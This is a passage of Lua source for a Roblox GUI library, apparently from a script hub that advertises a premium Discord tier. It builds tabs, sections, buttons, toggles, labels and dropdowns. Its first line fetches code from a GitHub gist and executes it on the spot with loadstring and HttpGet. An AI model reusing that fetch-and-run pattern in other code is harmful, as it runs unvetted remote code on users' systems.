local notiflibs = loadstring(game:HttpGet("https://gist.githubusercontent.com/ECLIPSEXHUB/2eb5faec47ed518ae47914744b6c1251/raw/", true))()
notiflibs:NewNotif([[
DISCORD INVITE COPIED TO YOUR CLIPBOARD! 
OPEN A BUY PREMIUM TICKET IN THE INFO CHANNEL!]], 4)
end)

local CStroke = Instance.new("UIStroke")
CStroke.Parent = CPrem
CStroke.Name = "CStroke"
CStroke.Enabled = true
CStroke.Color = Color3.fromRGB(243,243,243)
CStroke.Thickness = 1
CStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
CStroke.LineJoinMode = Enum.LineJoinMode.Round

local CSGrad = Instance.new("UIGradient")
CSGrad.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(79, 126, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(161, 84, 255))}
CSGrad.Rotation = 20
CSGrad.Name = "CSGrad"
CSGrad.Parent = CStroke

CCorner.Name = "CCorner"
CCorner.Parent = CPrem
end





---q
----------------------------------d
-------------------------------------------------------------------------------COLOROPTIONS NED

















    
        
        local Elements = {}
    
        function Elements:NewTab(tabname)
            local Container2 = Instance.new("ScrollingFrame")
            local Container_2_uicorner = Instance.new("UICorner")
            local UIGridLayout = Instance.new("UIGridLayout")
            local Right = Instance.new("Frame")
            local ListRight = Instance.new("UIListLayout")
            local ListLeft = Instance.new("UIListLayout")
            local Left = Instance.new("Frame")
            local UIListLayout3643 = Instance.new("UIListLayout")
    
    
            Container2.Name = "Container2"
            Container2.Parent = Containers
            Container2.Active = true
            Container2.AnchorPoint = Vector2.new(0.5, 0.5)
            Container2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
            Container2.BackgroundTransparency = 1.000
            Container2.BorderColor3 = Color3.fromRGB(19, 19, 19)
            Container2.Position = UDim2.new(0.499, 2,0.002, 200)
            Container2.Size = UDim2.new(0, 468,0, 389)
            Container2.CanvasSize = UDim2.new(0, 0, 0, 0)
            Container2.ScrollBarThickness = 1
            Container2.ScrollBarImageColor3 = Color3.fromRGB(42, 78, 199)
            Container2.AutomaticCanvasSize = Enum.AutomaticSize.Y
            Container2.ScrollingDirection = Enum.ScrollingDirection.Y
            Container2.Visible = false
    
            UIListLayout3643.Parent = Container2
    UIListLayout3643.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout3643.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout3643.Padding = UDim.new(0, 7)
    
            Left.Name = "Left"
    Left.Parent = Container2
    Left.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Left.BackgroundTransparency = 1.000
    Left.Position = UDim2.new(-0.00476783467, 0, 0, 0)
    Left.Size = UDim2.new(0, 231, 0, 0)
    Left.AutomaticSize = Enum.AutomaticSize.Y
    
    ListLeft.Name = "ListLeft"
    ListLeft.Parent = Left
    ListLeft.SortOrder = Enum.SortOrder.LayoutOrder
    ListLeft.Padding = UDim.new(0, 20)
    
    Right.Name = "Right"
    Right.Parent = Container2
    Right.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Right.BackgroundTransparency = 1.000
    Right.Position = UDim2.new(0.505119562, 0, 0, 0)
    Right.Size = UDim2.new(0, 231, 0, 0)
    Right.AutomaticSize = Enum.AutomaticSize.Y
    
    ListRight.Name = "ListRight"
    ListRight.Parent = Right
    ListRight.SortOrder = Enum.SortOrder.LayoutOrder
    ListRight.Padding = UDim.new(0, 8)
    
    
            
    
            Container_2_uicorner.Name = "Container_2_uicorner"
            Container_2_uicorner.Parent = Container2
    
            UIGridLayout.Parent = Container2
            UIGridLayout.CellSize = UDim2.new(0, 230, 0, 300)
            UIGridLayout.FillDirectionMaxCells = 2
    
            local TextButton_2 = Instance.new("TextButton")
            local UICorner_3 = Instance.new("UICorner")
    
            TextButton_2.Parent = TabsContainer
    TextButton_2.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
    TextButton_2.Position = UDim2.new(0, 0, 0.0238095243, 0)
    TextButton_2.Size = UDim2.new(0, 84, 0, 18)
    TextButton_2.Modal = true
    TextButton_2.Font = Enum.Font.GothamMedium
    TextButton_2.Text = tabname
    TextButton_2.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[2])
    TextButton_2.TextSize = 14.000
    TextButton_2.TextWrapped = true
    
    local btn = TextButton_2
    local uiGradient = Instance.new("UIGradient")
    
    uiGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 179, 255))}
    uiGradient.Offset = Vector2.new(-2, 0)
    uiGradient.Rotation = 200
    uiGradient.Parent = btn
    
    local isHovering = false
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
    
    local gradientRemoveTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-2, 0)})
    local gradientRestoreTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-0.3, 0)})
    
    btn.MouseEnter:Connect(function()
    
        isHovering = true
        
        gradientRestoreTween:Play()
    end)
    
    btn.MouseLeave:Connect(function()
        
        isHovering = false
        
        gradientRemoveTween:Play()
    end)
    
    UICorner_3.Parent = TextButton_2
    UICorner_3.CornerRadius = UDim.new(0, 3)
    
    
    
    
    
    
    TextButton_2.MouseButton1Click:connect(
                function()
                    for i, v in next, Containers:GetChildren() do
                        v.Visible = false
                    end
                    Container2.Visible = true
                end
            )
    
            
            local sectionelements = {}
    function sectionelements:NewSection(name, visible)
        visible = visible or "no response"
    local Section = Instance.new("Frame")
    local UIListLayout7422774 = Instance.new("UIListLayout")
    local SectionName = Instance.new("Frame")
    local sectionsname = Instance.new("TextLabel")
    local hidearrow = Instance.new("ImageButton")
    local format_align_left = Instance.new("ImageButton")
    local UICorner683237 = Instance.new("UICorner")
    local SectionInners = Instance.new("Frame")
    local UIListLayout83274 = Instance.new("UIListLayout")
    
    local lefts
    local rights
    --Properties:
    
    for i, v in next, Left:GetChildren() do
        lefts = i
    end
    print(lefts)
    
    for i, v in next, Right:GetChildren() do
        rights = i
    end
    print(rights)
    
    
    
    Section.Name = name
    if lefts > rights then
        Section.Parent = Right
    else
        Section.Parent = Left
    end
    Section.AnchorPoint = Vector2.new(0.5, 0.5)
    Section.BackgroundColor3 = Color3.fromRGB(COLORTABLE.MainBackGround[1],COLORTABLE.MainBackGround[2],COLORTABLE.MainBackGround[3])
    Section.ClipsDescendants = true
    Section.Position = UDim2.new(0.322811633, 0, -0.0107296137, 0)
    Section.Size = UDim2.new(0, 230, 0, 0)
    Section.AutomaticSize = Enum.AutomaticSize.Y
    
    UIListLayout7422774.Name = "UIListLayout7422774"
    UIListLayout7422774.Parent = Section
    UIListLayout7422774.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout7422774.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout7422774.Padding = UDim.new(0, 5)
    
    SectionName.Name = "SectionName"
    SectionName.Parent = Section
    SectionName.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
    SectionName.BorderColor3 = Color3.fromRGB(0, 0, 0)
    SectionName.BorderSizePixel = 0
    SectionName.Position = UDim2.new(0.154506445, 0, 0, 0)
    SectionName.Size = UDim2.new(0, 230, 0, 34)
    
    sectionsname.Name = "sectionsname"
    sectionsname.Parent = SectionName
    sectionsname.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    sectionsname.BackgroundTransparency = 1.000
    sectionsname.BorderSizePixel = 0
    sectionsname.Position = UDim2.new(0.153629854, 0, 0, 2)
    sectionsname.Size = UDim2.new(0, 123, 0, 25)
    sectionsname.Font = Enum.Font.GothamMedium
    sectionsname.TextColor3 = Color3.fromRGB(235, 235, 235)
    sectionsname.TextSize = 14.000
    sectionsname.Text = name
    sectionsname.TextXAlignment = Enum.TextXAlignment.Left
    
    format_align_left.Name = "format_align_left"
    format_align_left.Parent = SectionName
    format_align_left.BackgroundTransparency = 1.000
    format_align_left.Position = UDim2.new(0.00200000009, 0, 0, 4)
    format_align_left.Size = UDim2.new(0, 22, 0, 22)
    format_align_left.ZIndex = 2
    format_align_left.Image = "rbxassetid://3926305904"
    format_align_left.ImageColor3 = Color3.fromRGB(COLORTABLE.ElementsIconColour[1],COLORTABLE.ElementsIconColour[2],COLORTABLE.ElementsIconColour[3])
    format_align_left.ImageRectOffset = Vector2.new(4, 44)
    format_align_left.ImageRectSize = Vector2.new(36, 36)
    
    
    UICorner683237.CornerRadius = UDim.new(0, 4)
    UICorner683237.Name = "UICorner683237"
    UICorner683237.Parent = Section
    
    SectionInners.Name = "SectionInners"
    SectionInners.Parent = Section
    SectionInners.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
    SectionInners.ClipsDescendants = true
    SectionInners.Position = UDim2.new(0.154506445, 0, 0.129139066, 0)
    SectionInners.Size = UDim2.new(0, 230, 0, 0)
    SectionInners.AutomaticSize = Enum.AutomaticSize.Y
    
    UIListLayout83274.Name = "UIListLayout83274"
    UIListLayout83274.Parent = SectionInners
    UIListLayout83274.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout83274.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout83274.Padding = UDim.new(0, 5)
    
    
            local SYLSLIB = {}
    
            function SYLSLIB:NewButton(Butname, callback)
                local button = Instance.new("TextButton")
                local UICorner_11 = Instance.new("UICorner")
                local ImageLabel_3 = Instance.new("ImageLabel")
                local Buttonname = Instance.new("TextLabel")
    
    
                button.Name = Butname
                button.Parent = SectionInners
                button.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
                button.BorderColor3 = Color3.fromRGB(0, 44, 65)
                button.Position = UDim2.new(0.167186558, 0, 0.205323189, 0)
                button.Size = UDim2.new(0, 221, 0, 22)
                button.Text = " "
                button.Font = Enum.Font.Gotham
                button.TextColor3 = Color3.fromRGB(235, 235, 235)
                button.TextSize = 15.000
    
                Buttonname.Name = Butname
    Buttonname.Parent = button
    Buttonname.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Buttonname.BackgroundTransparency = 1.000
    Buttonname.Position = UDim2.new(0.152557239, 0, 0.0256625097, 0)
    Buttonname.Size = UDim2.new(0, 77, 0, 21)
    Buttonname.Font = Enum.Font.Gotham
    Buttonname.Text = Butname
    Buttonname.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
    Buttonname.TextSize = 13.000

    Buttonname.TextWrapped = true
    Buttonname.TextXAlignment = Enum.TextXAlignment.Left
    
                UICorner_11.CornerRadius = UDim.new(0, 4)
                UICorner_11.Parent = button
                
                ImageLabel_3.Parent = button
                ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                ImageLabel_3.BackgroundTransparency = 1.000
                ImageLabel_3.Position = UDim2.new(0.028, 0,0.216, -4)
                ImageLabel_3.Size = UDim2.new(0, 18, 0, 18)
                ImageLabel_3.ImageColor3 = Color3.fromRGB(COLORTABLE.ElementsIconColour[1],COLORTABLE.ElementsIconColour[2],COLORTABLE.ElementsIconColour[3])
                ImageLabel_3.Image = "rbxassetid://3926305904"
                ImageLabel_3.ImageRectOffset = Vector2.new(84, 204)
                ImageLabel_3.ImageRectSize = Vector2.new(36, 36)
    
                local btn = button
                local uiGradient = Instance.new("UIGradient")
    
                uiGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 179, 255))}
                uiGradient.Offset = Vector2.new(-2, 0)
                uiGradient.Rotation = 200
                uiGradient.Parent = btn
                
                local isHovering = false
                
                local tweenService = game:GetService("TweenService")
                local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
                
                local gradientRemoveTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-2, 0)})
                local gradientRestoreTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-0.3, 0)})
    
                btn.MouseEnter:Connect(function()
        
                    isHovering = true
                    
                    gradientRestoreTween:Play()
                end)
                
                btn.MouseLeave:Connect(function()
                    
                    isHovering = false
                    
                    gradientRemoveTween:Play()
                end)
    
                button.MouseButton1Down:connect(
                    function()
                        pcall(callback)
                    end
                )
            end
            function SYLSLIB:NewToggle(Togname, callback)
                local toggled = false
    
                callback = callback or function()
                    end
                local Toggle = Instance.new("TextButton")
                local UICorner_10 = Instance.new("UICorner")
                local ImageLabel_2 = Instance.new("ImageLabel")
                local ImageLabel_20 = Instance.new("ImageLabel")
                local Togglename = Instance.new("TextLabel")
    
                Toggle.Name = Togname
                Toggle.Parent = SectionInners
                Toggle.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
                Toggle.BorderColor3 = Color3.fromRGB(0, 44, 65)
                Toggle.Position = UDim2.new(0.167186558, 0, 0.102661595, 0)
                Toggle.Size = UDim2.new(0, 221, 0, 28)
                Toggle.Font = Enum.Font.Gotham
                Toggle.Text = " "
                Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
                Toggle.TextSize = 15.000
    
                Togglename.Name = "Togglename"
    Togglename.Parent = Toggle
    Togglename.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Togglename.BackgroundTransparency = 1.000
    Togglename.Position = UDim2.new(0.152557239, 0, 0.162026539, 0)
    Togglename.Size = UDim2.new(0, 77, 0, 23)
    Togglename.Font = Enum.Font.Gotham
    Togglename.Text = Togname
    Togglename.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
    Togglename.TextSize = 13.000
    Togglename.TextWrapped = true
    Togglename.TextXAlignment = Enum.TextXAlignment.Left
    
                local btn = Toggle
                local uiGradient = Instance.new("UIGradient")
    
                uiGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 179, 255))}
                uiGradient.Offset = Vector2.new(-2, 0)
                uiGradient.Rotation = 200
                uiGradient.Parent = btn
                
                local isHovering = false
                
                local tweenService = game:GetService("TweenService")
                local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
                
                local gradientRemoveTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-2, 0)})
                local gradientRestoreTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-0.3, 0)})
    
                btn.MouseEnter:Connect(function()
        
                    isHovering = true
                    
                    gradientRestoreTween:Play()
                end)
                
                btn.MouseLeave:Connect(function()
                    
                    isHovering = false
                    
                    gradientRemoveTween:Play()
                end)
    
    UICorner_10.CornerRadius = UDim.new(0, 4)
    UICorner_10.Parent = Toggle
    
    ImageLabel_2.Parent = Toggle
    ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel_2.BackgroundTransparency = 1.000
    ImageLabel_2.Position = UDim2.new(0.0280000009, 0, 0.216000006, 0)
    ImageLabel_2.Size = UDim2.new(0, 18, 0, 18)
    ImageLabel_2.ImageColor3 = Color3.fromRGB(COLORTABLE.ElementsIconColour[1],COLORTABLE.ElementsIconColour[2],COLORTABLE.ElementsIconColour[3])
    ImageLabel_2.Image = "rbxassetid://3926309567"
    ImageLabel_2.ImageRectOffset = Vector2.new(628, 420)
    ImageLabel_2.ImageRectSize = Vector2.new(48, 48)
    
    ImageLabel_20.Parent = Toggle
    ImageLabel_20.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel_20.BackgroundTransparency = 1.000
    ImageLabel_20.ImageTransparency = 1.000
    ImageLabel_20.Position = UDim2.new(0.0280000009, 0, 0.216000006, 0)
    ImageLabel_20.Size = UDim2.new(0, 18, 0, 18)
    ImageLabel_2.ImageColor3 = Color3.fromRGB(COLORTABLE.ElementsIconColour[1],COLORTABLE.ElementsIconColour[2],COLORTABLE.ElementsIconColour[3])
    ImageLabel_20.Image = "rbxassetid://3926309567"
    ImageLabel_20.ImageRectOffset = Vector2.new(784, 420)
    ImageLabel_20.ImageRectSize = Vector2.new(48, 48)
                Toggle.MouseButton1Click:connect(
                    function()
                        if toggled == false then
                            toggled = true
                            pcall(callback, toggled)
                            toggled = false
                            local tweenService = game:GetService("TweenService")
                            local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
                            local tweenInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
                            local gradientRestoreTween = tweenService:Create(ImageLabel_2, tweenInfo, {ImageTransparency = 1.000})   
                            local gradientRestoreTween2 = tweenService:Create(ImageLabel_20, tweenInfo2, {ImageTransparency = 0.000})   
                            gradientRestoreTween:Play()
                            gradientRestoreTween2:Play()
                            wait(0.35)
                            toggled = true
                        else
                            toggled = false
                            pcall(callback, toggled)
                            toggled = true
                            local tweenService = game:GetService("TweenService")
                            local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
                            local tweenInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
                            local gradientRestoreTween = tweenService:Create(ImageLabel_2, tweenInfo, {ImageTransparency = 0.000})   
                            local gradientRestoreTween2 = tweenService:Create(ImageLabel_20, tweenInfo2, {ImageTransparency = 1.000})   
                            gradientRestoreTween:Play()
                            gradientRestoreTween2:Play()
                            wait(0.35)
                            toggled = false
                        end
                    end
                )
            end
            function SYLSLIB:NewLabel(LabName)
                local Label = Instance.new("TextLabel")
                local UICorner_17 = Instance.new("UICorner")
                Label.Name = LabName
    Label.Parent = SectionInners
    Label.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
    Label.BorderColor3 = Color3.fromRGB(0, 44, 65)
    Label.Position = UDim2.new(0.167186558, 0, 0.39543727, 0)
    Label.Size = UDim2.new(0, 221, 0, 20)
    Label.Font = Enum.Font.GothamMedium
    Label.Text = LabName
    Label.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
    Label.TextSize = 15.000
    Label.TextScaled = true
    Label.TextWrapped = true
    
    local btn = Label
    local uiGradient = Instance.new("UIGradient")
    
    uiGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 179, 255))}
    uiGradient.Offset = Vector2.new(-2, 0)
    uiGradient.Rotation = 200
    uiGradient.Parent = btn
    
    UICorner_17.CornerRadius = UDim.new(0, 4)
    UICorner_17.Parent = Label
    
                local labelfunction = {}
    
                function labelfunction:UpdateLabel(newname)
                    Label.Text = newname
                end
                function labelfunction:NewlabelColor(newname)
                    Label.BackgroundColor3 = newname
                end
                function labelfunction:NewlabelTextColor(newname)
                    Label.TextColor3 = newname
                end
                return labelfunction
            end
            function SYLSLIB:NewDropdown(ddt, list, callback)
                callback = callback or function()
                    end
    
                local dropped = false
    
                local Dropdown = Instance.new("TextButton")
                local UICorner_11 = Instance.new("UICorner")
                local ImageLabel_4 = Instance.new("ImageLabel")
                local Option = Instance.new("TextLabel")
                local UICorner_12 = Instance.new("UICorner")
                local DropdownContainer = Instance.new("Frame")
                local UIListLayout_2 = Instance.new("UIListLayout")
                local UICorner_14 = Instance.new("UICorner")
                local Textboxname = Instance.new("TextLabel")
    
                Dropdown.Name = ddt
                Dropdown.Parent = SectionInners
                Dropdown.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
                Dropdown.BorderColor3 = Color3.fromRGB(0, 44, 65)
                Dropdown.Position = UDim2.new(0.167186558, 0, 0.475285172, 0)
                Dropdown.Size = UDim2.new(0, 221, 0, 28)
                Dropdown.Font = Enum.Font.Gotham
                Dropdown.Text = " "
                Dropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
                Dropdown.TextSize = 15.000
    
                Textboxname.Name = "Textboxname"
    Textboxname.Parent = Dropdown
    Textboxname.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Textboxname.BackgroundTransparency = 1.000
    Textboxname.Position = UDim2.new(0.152557239, 0, 0.0256620143, 0)
    Textboxname.Size = UDim2.new(0, 136, 0, 26)
    Textboxname.Font = Enum.Font.Gotham
    Textboxname.Text = ddt
    Textboxname.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
    Textboxname.TextSize = 13.000
    Textboxname.TextWrapped = true
    Textboxname.TextXAlignment = Enum.TextXAlignment.Left
    
                local btn = Dropdown
                local uiGradient = Instance.new("UIGradient")
    
                uiGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 179, 255))}
                uiGradient.Offset = Vector2.new(-2, 0)
                uiGradient.Rotation = 200
                uiGradient.Parent = btn
                
                local isHovering = false
                
                local tweenService = game:GetService("TweenService")
                local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
                
                local gradientRemoveTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-2, 0)})
                local gradientRestoreTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-0.3, 0)})
    
                btn.MouseEnter:Connect(function()
        
                    isHovering = true
                    
                    gradientRestoreTween:Play()
                end)
                
                btn.MouseLeave:Connect(function()
                    
                    isHovering = false
                    
                    gradientRemoveTween:Play()
                end)
    
                UICorner_11.CornerRadius = UDim.new(0, 4)
                UICorner_11.Parent = Dropdown
    
                ImageLabel_4.Parent = Dropdown
                ImageLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                ImageLabel_4.BackgroundTransparency = 1.000
                ImageLabel_4.Position = UDim2.new(0.0280000009, 0, 0.216000006, 0)
                ImageLabel_4.Size = UDim2.new(0, 18, 0, 18)
                ImageLabel_4.Image = "rbxassetid://3926305904"
                ImageLabel_4.ImageColor3 = Color3.fromRGB(COLORTABLE.ElementsIconColour[1],COLORTABLE.ElementsIconColour[2],COLORTABLE.ElementsIconColour[3])
                ImageLabel_4.ImageRectOffset = Vector2.new(644, 364)
                ImageLabel_4.ImageRectSize = Vector2.new(36, 36)
    
                Option.Name = "Option"
                Option.Parent = Dropdown
                Option.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
                Option.BorderColor3 = Color3.fromRGB(19, 19, 19)
                Option.Position = UDim2.new(0.786069691, 0, 0.126447409, 0)
                Option.Size = UDim2.new(0, 44, 0, 21)
                Option.Font = Enum.Font.Gotham
                Option.Text = "selected option"
                Option.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
                Option.TextScaled = true
                Option.TextSize = 15.000
                Option.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
                Option.TextWrapped = true
    
                UICorner_12.CornerRadius = UDim.new(0, 4)
                UICorner_12.Parent = Option
    
    
                DropdownContainer.Name = "Dropdown Container"
                DropdownContainer.Parent = SectionInners
                DropdownContainer.Active = true
                DropdownContainer.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
                DropdownContainer.BackgroundTransparency = 1.000
                DropdownContainer.BorderColor3 = Color3.fromRGB(65, 65, 65)
                DropdownContainer.Position = UDim2.new(0, 0, 0.119294375, 0)
                DropdownContainer.Size = UDim2.new(0, 385, 0, 0)
                DropdownContainer.AutomaticSize = Enum.AutomaticSize.Y
                DropdownContainer.Visible = false
    
                UIListLayout_2.Parent = DropdownContainer
                UIListLayout_2.Padding = UDim.new(0, 5)
                UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
                UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
    
                UICorner_14.CornerRadius = UDim.new(0, 4)
                UICorner_14.Parent = DropdownContainer
    
                Dropdown.MouseButton1Click:connect(
                    function()
                        if dropped == true then
                            dropped = false
                            DropdownContainer.Visible = false
                        else
                            dropped = true
                            DropdownContainer.Visible = true
                        end
                    end
                )
    
                for i, v in next, list do
                    local TextButton = Instance.new("TextButton")
                    local UICorner_13 = Instance.new("UICorner")
    
    
                    TextButton.Name = "Child"
                    TextButton.Parent = DropdownContainer
                    TextButton.BorderSizePixel = 0
                    TextButton.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
                    TextButton.BorderColor3 = Color3.fromRGB(0, 44, 65)
                    TextButton.Position = UDim2.new(-0.371040732, 0, 0, 0)
                    TextButton.Size = UDim2.new(0, 214, 0, 31)
                    TextButton.Font = Enum.Font.Gotham
                    TextButton.Text = v
                    TextButton.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
                    TextButton.TextSize = 12.000
                    TextButton.TextWrapped = true
                    TextButton.TextScaled = true
                    UICorner_13.CornerRadius = UDim.new(0, 7)
                    UICorner_13.Parent = TextButton
    
                    local btn = TextButton
                    local uiGradient = Instance.new("UIGradient")
        
                    uiGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 179, 255))}
                    uiGradient.Offset = Vector2.new(-2, 0)
                    uiGradient.Rotation = 200
                    uiGradient.Parent = btn
                    
                    local isHovering = false
                    
                    local tweenService = game:GetService("TweenService")
                    local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
                    
                    local gradientRemoveTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-2, 0)})
                    local gradientRestoreTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-0.3, 0)})
        
                    btn.MouseEnter:Connect(function()
            
                        isHovering = true
                        
                        gradientRestoreTween:Play()
                    end)
                    
                    btn.MouseLeave:Connect(function()
                        
                        isHovering = false
                        
                        gradientRemoveTween:Play()
                    end)
    
                    UICorner_13.CornerRadius = UDim.new(0, 7)
                    UICorner_13.Parent = TextButton
    
                    TextButton.MouseButton1Click:connect(
                        function()
                            Option.Text = v
                            callback(Option.Text)
                            DropdownContainer.Visible = false
                            dropped = false
                        end
                    )
                end
    
                local Dropdownfunctions = {}
    
                function Dropdownfunctions:Refresh(NewList)
                    print(NewList)
                    NewList = NewList or {}
                    for a, b in pairs(DropdownContainer:GetChildren()) do
                        print(b)
                        if b.Name == "Child" then
                            print("destroyed "..b)
                            b:Destroy()
                        end
                    end
                    for i, v in next, NewList do
                        local TextButton = Instance.new("TextButton")
                        local UICorner_13 = Instance.new("UICorner")
        
                        TextButton.Name = "Child"
                        TextButton.Parent = DropdownContainer
                        TextButton.BorderSizePixel = 0
                        TextButton.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
                        TextButton.BorderColor3 = Color3.fromRGB(0, 44, 65)
                        TextButton.Position = UDim2.new(-0.371040732, 0, 0, 0)
                        TextButton.Size = UDim2.new(0, 214, 0, 31)
                        TextButton.Font = Enum.Font.Gotham
                        TextButton.Text = v
                        TextButton.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
                        TextButton.TextSize = 15.000
    
                        local btn = TextButton
                    local uiGradient = Instance.new("UIGradient")
        
                    uiGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 179, 255))}
                    uiGradient.Offset = Vector2.new(-2, 0)
                    uiGradient.Rotation = 200
                    uiGradient.Parent = btn
                    
                    local isHovering = false
                    
                    local tweenService = game:GetService("TweenService")
                    local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
                    
                    local gradientRemoveTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-2, 0)})
                    local gradientRestoreTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-0.3, 0)})
        
                    btn.MouseEnter:Connect(function()
            
                        isHovering = true
                        
                        gradientRestoreTween:Play()
                    end)
                    
                    btn.MouseLeave:Connect(function()
                        
                        isHovering = false
                        
